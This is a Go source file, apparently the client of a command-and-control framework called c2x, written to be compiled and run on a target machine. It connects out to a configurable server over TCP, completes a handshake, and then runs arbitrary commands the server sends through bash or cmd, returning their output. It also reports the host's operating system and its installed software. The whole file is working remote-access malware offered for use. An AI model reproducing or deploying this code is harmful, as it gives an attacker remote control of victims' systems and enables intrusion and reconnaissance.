package main

import (
	"bufio"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strings"

	"github.com/matishsiao/goInfo"
)

/*
c2x-client-go is client of c2x you should compile it and run it in target system
c2x-client-go repo : https://github.com/nxenon/c2x-client-go
c2x project : https://github.com/nxenon/c2x
*/

var gotHello = false // if server sends c2x-hello_back got_hello changes to true
var clientSocket net.Conn // global variable to store client socket


func main(){

	var ip = "replace_server_ip"
	var port = "replace_server_port"
	var ip_and_port = ip + ":" + port

	connectToServer(ip_and_port)

}

func connectToServer(ip_and_port string){

	// function for connecting to server
	c, err := net.Dial("tcp", ip_and_port)
	if err != nil {
		println(err.Error())
		return
	}
	clientSocket = c
	receiveReply()

}

func receiveReply(){

	for true {
		data, err := bufio.NewReader(clientSocket).ReadString('\n')
		if err != nil {
			return
		}
		commandInterpreter(data)
	}

}

func commandInterpreter(reply string){

	reply_trimmed := strings.TrimSpace(reply)
	reply = reply_trimmed

	if !gotHello{
		if reply == "c2x-hello" {
			sendHelloBack()
			gotHello = true
		} else {
			clientSocket.Close()
			// Connection closed! (haven't received c2x-hello)
			os.Exit(1)

		}

	} else if reply == "c2x-quit"{

		clientSocket.Close()
		os.Exit(0)


	} else if strings.HasPrefix(reply, "cid=") {

		var get_cid_pattern = `cid=(\d*),`
		r, _ := regexp.Compile(get_cid_pattern)

		var cid_array []string = r.FindStringSubmatch(reply)
		// cid_array for cid=1, is ["cid=1," "1"]
		if len(cid_array) == 2 {

			var cid = cid_array[1]
			var code = translateCodesList(cid)
			// reply is message sent from server
			interpretCodes(code, reply)
		}
	}

}

func translateCodesList(c string) string {

	codes_list := map[string]string{
		"exec":"1",
		"1":"exec",
		"__comment__get_os":"cid=2, does not have second part (for request)",
		"get_os":"2",
		"2":"get_os",
		"get_software":"3",
		"3":"get_software",
	}

	translated := codes_list[c]
	return translated

}

func interpretCodes(code string, msg string){

	if code == "exec" {
		executeCommand(msg)
	} else if code == "get_os" {
		sendOsInfo()
	} else if code == "get_software" {
		sendSoftware()
	}

}

func splitCid(text string) []string {

	splitted := strings.Split(text, ",")
	return splitted

}

func sendMsg(msg string){

	clientSocket.Write([]byte(msg))

}

func msgManager(msg string){

	sendMsg(msg)

}

func executeCommand(msg string){

	var splitted_msg []string = splitCid(msg)
	if len(splitted_msg) >= 2 {
		command := strings.Join(splitted_msg[1:], ",")

		os_info := goInfo.GetInfo()

		var executable_name string
		var command_arg string

		if os_info.GoOS == "linux" {
			executable_name = "bash"
			command_arg = "-c"
		} else if os_info.GoOS == "windows" {
			executable_name = "cmd"
			command_arg = "/c"
		} else {
			println("OS Not Detected")
		}

		out, err := exec.Command(executable_name, command_arg, command).Output()

		var prefix = "cid=" + translateCodesList("exec") + ","

		if err != nil {
			msgManager(prefix + err.Error())
		} else {
			msgManager(prefix + string(out))
		}
	}

}

func sendHelloBack(){

	var hello_back_msg = "c2x-hello_back"
	msgManager(hello_back_msg)

}

func sendSoftware(){

	os_info := goInfo.GetInfo()

	var answer string
	var command string

	if os_info.GoOS == "linux" {
		command = "ls /usr/bin /opt"
		out, err := exec.Command("bash", "-c", command).Output()
		if err != nil {
			answer = err.Error()
		} else {
			answer = string(out)
		}
	} else if os_info.GoOS == "windows" {
		command = "Get-WmiObject -Class Win32_Product | Select-Object -Property Name"
		out, err := exec.Command("powershell", "/c", command).Output()
		if err != nil {
			answer = err.Error()
		} else {
			answer = string(out)
		}

	} else {
		answer = "OS Not Detected ---> " + os_info.GoOS + " : " + os_info.Core
	}
	msgManager("cid=3," + answer)

}

func sendOsInfo(){

	os_info := goInfo.GetInfo()
	var os_name = os_info.GoOS + " " + os_info.Core
	var prefix = "cid=" + translateCodesList("get_os") + ","
	msgManager(prefix + os_name)

}
